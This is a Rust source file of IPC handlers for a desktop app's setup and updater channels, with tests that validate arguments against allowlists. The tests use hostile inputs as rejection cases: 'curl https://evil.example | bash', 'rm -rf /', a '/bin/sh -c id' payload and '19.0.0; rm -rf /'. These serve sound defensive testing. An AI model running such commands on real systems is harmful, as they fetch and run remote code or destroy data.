//! Direct core IPC handlers for the 9 setup/updater channels (H(c), routed `tauri-shell -> ompdesk-core`):
//! `setup:get-state`, `setup:retry`, `setup:cancel`, `omp-update:get-state`, `omp-update:now`,
//! `cli-update:get-state`, `cli-update:now`, `extension-update:get-state`, `extension-update:now`.
//!
//! Each handler validates its arguments identically to the retired Node wrappers in `src/main/tools/ipc.ts` before
//! touching the live `tools` hub instance via `hub::post`. State pushes (`setup:state`, `omp-update:state`,
//! `cli-update:state`, `extension-update:state`) continue flowing through the hub's `Out::push` to main.
//! `setup:git-aslr` stays in Node for now.

use std::rc::Rc;

use serde_json::value::RawValue;
use serde_json::{Value, json};
use tokio::sync::oneshot;

use super::{Tools, active_instance, call_tools, cli, ext, omp, setup};
use crate::control::js::string_of_value;
use crate::hub::{self, Outcome};
use crate::ipc::{Handled, IpcContext};
use crate::server::Fault;

fn js_arg_string(arg: Option<&Value>) -> String {
    match arg {
        None => "undefined".to_owned(),
        Some(value) => string_of_value(value),
    }
}

fn raw_json(value: &Value) -> Box<RawValue> {
    RawValue::from_string(value.to_string()).expect("serde_json::Value serializes to valid JSON")
}

fn not_open() -> Fault {
    Fault::new("closed", "The tools instance is not open")
}

fn fire_and_forget(outcome: Outcome) {
    if let Outcome::Later(future) = outcome {
        hub::spawn(async move {
            let _ = future.await;
        });
    }
}

async fn on_hub<T: Send + 'static>(
    work: impl FnOnce(Option<Rc<Tools>>) -> T + Send + 'static,
) -> Result<T, Fault> {
    let (tx, rx) = oneshot::channel();
    hub::post(move || {
        let _ = tx.send(work(active_instance()));
    });
    rx.await
        .map_err(|_| Fault::new("internal", "The hub thread ended before answering"))
}

/// Main's spawn environment (`env`) from the active `tools` hub instance, falling back to `std::env::vars()`.
pub(crate) async fn spawn_env_map() -> std::collections::BTreeMap<String, String> {
    let (tx, rx) = oneshot::channel();
    hub::post(move || {
        let Some(tools) = active_instance() else {
            let _ = tx.send(None);
            return;
        };
        hub::spawn(async move {
            let _ = tx.send(tools.base_env().await.ok());
        });
    });
    if let Ok(Some(env)) = rx.await
        && !env.is_empty()
    {
        return env;
    }
    std::env::vars().collect()
}

/// Main's login-shell `PATH` from the active `tools` hub instance (`env`), falling back to `std::env::var("PATH")`.
pub(crate) async fn spawn_path() -> String {
    let mut env = spawn_env_map().await;
    if let Some(path) = env.remove("PATH").or_else(|| env.remove("Path"))
        && !path.is_empty()
    {
        return path;
    }
    std::env::var("PATH").unwrap_or_default()
}

pub(crate) fn ipc_setup_get_state(_ctx: IpcContext, _args: Vec<Value>) -> Handled {
    Box::pin(async move {
        on_hub(|tools| match tools {
            Some(tools) => Ok(Some(setup::state(&tools))),
            None => Err(not_open()),
        })
        .await?
    })
}

pub(crate) fn ipc_setup_retry(_ctx: IpcContext, args: Vec<Value>) -> Handled {
    Box::pin(async move {
        let Some(item) = args
            .first()
            .and_then(Value::as_str)
            .filter(|item| setup::ITEMS.contains(item))
            .map(str::to_owned)
        else {
            return Err(Fault::new(
                "setup_item",
                format!("Unknown setup item: {}", js_arg_string(args.first())),
            ));
        };
        on_hub(move |tools| {
            if let Some(tools) = tools {
                let raw = raw_json(&json!({ "item": item }));
                fire_and_forget(call_tools(&tools, "setup.retry", &raw));
            }
        })
        .await?;
        Ok(None)
    })
}

pub(crate) fn ipc_setup_cancel(_ctx: IpcContext, _args: Vec<Value>) -> Handled {
    Box::pin(async move {
        let cancelled = on_hub(|tools| tools.is_some_and(|tools| tools.queue.cancel())).await?;
        Ok(Some(Value::Bool(cancelled)))
    })
}

pub(crate) fn ipc_omp_update_get_state(_ctx: IpcContext, _args: Vec<Value>) -> Handled {
    Box::pin(async move {
        on_hub(|tools| match tools {
            Some(tools) => Ok(Some(omp::state(&tools))),
            None => Err(not_open()),
        })
        .await?
    })
}

pub(crate) fn ipc_omp_update_now(_ctx: IpcContext, _args: Vec<Value>) -> Handled {
    Box::pin(async move {
        on_hub(|tools| {
            if let Some(tools) = tools {
                let raw = raw_json(&json!({}));
                fire_and_forget(call_tools(&tools, "omp.now", &raw));
            }
        })
        .await?;
        Ok(None)
    })
}

pub(crate) fn ipc_cli_update_get_state(_ctx: IpcContext, _args: Vec<Value>) -> Handled {
    Box::pin(async move {
        on_hub(|tools| match tools {
            Some(tools) => {
                // Settings opened: look for tools a provider connection or an install added since; the answer arrives as a push.
                let raw = raw_json(&json!({}));
                fire_and_forget(call_tools(&tools, "cli.rescan", &raw));
                Ok(Some(cli::state(&tools)))
            }
            None => Err(not_open()),
        })
        .await?
    })
}

pub(crate) fn ipc_cli_update_now(_ctx: IpcContext, args: Vec<Value>) -> Handled {
    Box::pin(async move {
        let id = match args.first() {
            None | Some(Value::Null) => None,
            Some(Value::String(id)) if cli::TOOLS.contains(&id.as_str()) => Some(id.clone()),
            other => {
                return Err(Fault::new(
                    "cli_tool",
                    format!("Unknown tool: {}", js_arg_string(other)),
                ));
            }
        };
        on_hub(move |tools| {
            if let Some(tools) = tools {
                let raw = raw_json(&json!({ "id": id }));
                fire_and_forget(call_tools(&tools, "cli.now", &raw));
            }
        })
        .await?;
        Ok(None)
    })
}

pub(crate) fn ipc_extension_update_get_state(_ctx: IpcContext, _args: Vec<Value>) -> Handled {
    Box::pin(async move {
        on_hub(|tools| match tools {
            Some(tools) => {
                // Settings opened: look for what a plugin install or an MCP edit added since; the answer arrives as a push.
                let raw = raw_json(&json!({}));
                fire_and_forget(call_tools(&tools, "ext.rescan", &raw));
                Ok(Some(ext::state(&tools)))
            }
            None => Err(not_open()),
        })
        .await?
    })
}

pub(crate) fn ipc_extension_update_now(_ctx: IpcContext, args: Vec<Value>) -> Handled {
    Box::pin(async move {
        let key = match args.first() {
            None | Some(Value::Null) => None,
            Some(Value::String(key)) => Some(key.clone()),
            other => {
                return Err(Fault::new(
                    "extension_key",
                    format!("Unknown extension: {}", js_arg_string(other)),
                ));
            }
        };
        on_hub(move |tools| {
            let Some(tools) = tools else {
                return match key {
                    None => Ok(()),
                    Some(key) => Err(Fault::new(
                        "extension_key",
                        format!("Unknown extension: {key}"),
                    )),
                };
            };
            let raw = raw_json(&json!({ "key": key }));
            match call_tools(&tools, "ext.now", &raw) {
                // Only a row of the current state is a handle; anything else is refused immediately.
                Outcome::Now(Err(fault)) if fault.code == "extension_key" => Err(fault),
                outcome => {
                    fire_and_forget(outcome);
                    Ok(())
                }
            }
        })
        .await??;
        Ok(None)
    })
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::sync::{Arc, Mutex};

    use super::*;
    use crate::ipc::Caller;
    use crate::tools::runner::Supervisor;
    use crate::tools::{Main, Opts, Scheduled, install_for_test, queue, remove_for_test};

    static NEXT_TEST_ID: AtomicU64 = AtomicU64::new(900_000);
    /// Serializes tests that share the hub thread's `ACTIVE` slot.
    static TEST_LOCK: std::sync::LazyLock<tokio::sync::Mutex<()>> =
        std::sync::LazyLock::new(Default::default);

    fn ctx() -> IpcContext {
        IpcContext {
            caller: Caller {
                key: "w1".into(),
                window: Some(1),
                conn_id: None,
                device_id: None,
            },
            user_data: None,
        }
    }

    struct StubMain {
        asks: Arc<Mutex<Vec<String>>>,
        inventory: Value,
    }

    impl Main for StubMain {
        fn push(&self, _item: Value) {}

        fn ask(&self, q: &str, payload: Value) -> hub::LocalFuture<Result<Value, Fault>> {
            self.asks
                .lock()
                .unwrap()
                .push(format!("{q}:{}", payload["method"].as_str().unwrap_or("")));
            let inventory = self.inventory.clone();
            let q = q.to_owned();
            let method = payload["method"].as_str().unwrap_or("").to_owned();
            Box::pin(async move {
                match q.as_str() {
                    "env" => Ok(json!({})),
                    "workspaceDirs" => Ok(json!([])),
                    "stock" if method == "extensions.inventory" => Ok(inventory),
                    "stock" if method == "accounts.providers" => Ok(json!({"providers": []})),
                    "stock" => Ok(json!({})),
                    _ => Ok(Value::Null),
                }
            })
        }
    }

    fn test_opts(dir: &std::path::Path) -> Opts {
        Opts {
            platform: "darwin".into(),
            arch: "arm64".into(),
            tools_dir: dir.join("tools").to_string_lossy().into_owned(),
            user_data: dir.to_string_lossy().into_owned(),
            app_version: "0.0.0".into(),
            tested_omp: "19.2.0".into(),
            automatic: false,
            scheduled: Scheduled {
                omp: true,
                cli: true,
                ext: true,
            },
            test_installer: None,
            test_download: None,
            test_omp_compat: None,
            manual: true,
            now: Some(1_000),
            system_root: "C:\\Windows".into(),
            agent_desktop_bundle: None,
            bun_install: dir.join("bun").to_string_lossy().into_owned(),
            mirror: None,
            locale: "en-US".into(),
            cwd: None,
            drive_cwds: BTreeMap::new(),
        }
    }

    async fn mount_tools(inventory: Value) -> (u64, tempfile::TempDir, Arc<Mutex<Vec<String>>>) {
        let dir = tempfile::tempdir().unwrap();
        let id = NEXT_TEST_ID.fetch_add(1, Ordering::Relaxed);
        let asks: Arc<Mutex<Vec<String>>> = Arc::default();
        let opts = test_opts(dir.path());
        let asks_clone = Arc::clone(&asks);
        let (tx, rx) = oneshot::channel();
        hub::post(move || {
            let main = Rc::new(StubMain {
                asks: asks_clone,
                inventory,
            });
            let tools = Tools::new(
                opts,
                main,
                hub::spawn,
                Supervisor::this_binary(),
                queue::STEP_MAX_MS,
            );
            tools.setup.borrow_mut().seams = setup::Seams::offline();
            cli::offline(&tools);
            install_for_test(id, tools);
            let _ = tx.send(());
        });
        rx.await.unwrap();
        (id, dir, asks)
    }

    async fn unmount_tools(id: u64) {
        let (tx, rx) = oneshot::channel();
        hub::post(move || {
            remove_for_test(id);
            let _ = tx.send(());
        });
        rx.await.unwrap();
    }

    #[tokio::test]
    async fn setup_state_cancel_and_retry_validation() {
        let _guard = TEST_LOCK.lock().await;
        let (id, _dir, _asks) = mount_tools(json!({})).await;

        let state = ipc_setup_get_state(ctx(), vec![]).await.unwrap().unwrap();
        assert_eq!(state["platform"], "darwin");
        assert_eq!(state["automatic"], false);
        assert_eq!(state["items"].as_array().unwrap().len(), 7);

        let cancelled = ipc_setup_cancel(ctx(), vec![]).await.unwrap().unwrap();
        assert_eq!(cancelled, Value::Bool(false));

        // Valid item returns undefined (None) immediately.
        assert_eq!(
            ipc_setup_retry(ctx(), vec![json!("omp")]).await.unwrap(),
            None
        );

        // Anything not a known item id is refused with JS String() spelling.
        let bad_cases: Vec<(Vec<Value>, &str)> = vec![
            (
                vec![json!("bun-install")],
                "Unknown setup item: bun-install",
            ),
            (
                vec![json!("curl https://evil.example | bash")],
                "Unknown setup item: curl https://evil.example | bash",
            ),
            (
                vec![json!({"file": "/bin/sh", "args": ["-c", "id"]})],
                "Unknown setup item: [object Object]",
            ),
            (vec![json!(["omp"])], "Unknown setup item: omp"),
            (vec![], "Unknown setup item: undefined"),
            (vec![Value::Null], "Unknown setup item: null"),
            (vec![json!(42)], "Unknown setup item: 42"),
        ];
        for (args, expected) in bad_cases {
            let fault = ipc_setup_retry(ctx(), args).await.unwrap_err();
            assert_eq!(fault.message, expected);
        }

        unmount_tools(id).await;
    }

    #[tokio::test]
    async fn omp_and_cli_update_channels_validate_and_return_state() {
        let _guard = TEST_LOCK.lock().await;
        let (id, _dir, asks) = mount_tools(json!({})).await;

        let omp_state = ipc_omp_update_get_state(ctx(), vec![])
            .await
            .unwrap()
            .unwrap();
        assert_eq!(omp_state["phase"], "idle");
        // Hostile arguments are ignored for omp-update:now.
        assert_eq!(
            ipc_omp_update_now(ctx(), vec![json!("19.0.0; rm -rf /")])
                .await
                .unwrap(),
            None
        );

        let cli_state = ipc_cli_update_get_state(ctx(), vec![])
            .await
            .unwrap()
            .unwrap();
        assert_eq!(cli_state["scheduled"], true);
        assert_eq!(cli_state["tools"], json!([]));

        // Valid tool id, missing arg, or null all succeed and return undefined.
        assert_eq!(
            ipc_cli_update_now(ctx(), vec![json!("codex")])
                .await
                .unwrap(),
            None
        );
        assert_eq!(ipc_cli_update_now(ctx(), vec![]).await.unwrap(), None);
        assert_eq!(
            ipc_cli_update_now(ctx(), vec![Value::Null]).await.unwrap(),
            None
        );

        for (arg, expected) in [
            (json!("rm -rf /"), "Unknown tool: rm -rf /"),
            (json!("/usr/bin/codex"), "Unknown tool: /usr/bin/codex"),
            (json!("codex --version"), "Unknown tool: codex --version"),
            (json!(5), "Unknown tool: 5"),
            (json!({"id": "codex"}), "Unknown tool: [object Object]"),
        ] {
            let fault = ipc_cli_update_now(ctx(), vec![arg]).await.unwrap_err();
            assert_eq!(fault.message, expected);
        }

        // Wait briefly for queued rescan to touch stock ask.
        tokio::time::sleep(std::time::Duration::from_millis(30)).await;
        assert!(!asks.lock().unwrap().is_empty());

        unmount_tools(id).await;
    }

    #[tokio::test]
    async fn extension_update_channels_validate_against_current_rows() {
        let _guard = TEST_LOCK.lock().await;
        let inventory = json!({
            "marketplaces": [],
            "plugins": [{
                "channel": "marketplace",
                "id": "a@m",
                "scope": "user",
                "cwd": null,
                "installed": "1.0.0",
                "spec": null,
                "enabled": true
            }],
            "registrySkills": [],
            "pluginSkills": 0,
            "localSkills": 0,
            "mcpServers": []
        });
        let (id, _dir, _asks) = mount_tools(inventory).await;

        // First get-state triggers ext.rescan so rows populate asynchronously.
        let initial = ipc_extension_update_get_state(ctx(), vec![])
            .await
            .unwrap()
            .unwrap();
        assert_eq!(initial["scheduled"], true);

        // Wait for the rescan step to populate the plugin row.
        let mut populated = false;
        for _ in 0..40 {
            let state = on_hub(|tools| ext::state(&tools.unwrap())).await.unwrap();
            if state["rows"]
                .as_array()
                .is_some_and(|rows| rows.iter().any(|r| r["key"] == "plugin:a@m:user"))
            {
                populated = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(15)).await;
        }
        assert!(populated, "expected ext.rescan to populate plugin:a@m:user");

        // Known key, missing arg, and null all succeed.
        assert_eq!(
            ipc_extension_update_now(ctx(), vec![json!("plugin:a@m:user")])
                .await
                .unwrap(),
            None
        );
        assert_eq!(ipc_extension_update_now(ctx(), vec![]).await.unwrap(), None);
        assert_eq!(
            ipc_extension_update_now(ctx(), vec![Value::Null])
                .await
                .unwrap(),
            None
        );

        // Unknown row keys, paths, empty strings, numbers, and objects are all refused.
        for (arg, expected) in [
            (json!("rm -rf /"), "Unknown extension: rm -rf /"),
            (json!("/usr/bin/tool"), "Unknown extension: /usr/bin/tool"),
            (
                json!("plugin:b@m:user"),
                "Unknown extension: plugin:b@m:user",
            ),
            (
                json!("plugin:a@m:user --force"),
                "Unknown extension: plugin:a@m:user --force",
            ),
            (json!(5), "Unknown extension: 5"),
            (
                json!({"key": "plugin:a@m:user"}),
                "Unknown extension: [object Object]",
            ),
            (json!(""), "Unknown extension: "),
        ] {
            let fault = ipc_extension_update_now(ctx(), vec![arg])
                .await
                .unwrap_err();
            assert_eq!(fault.message, expected);
        }

        unmount_tools(id).await;
    }
}
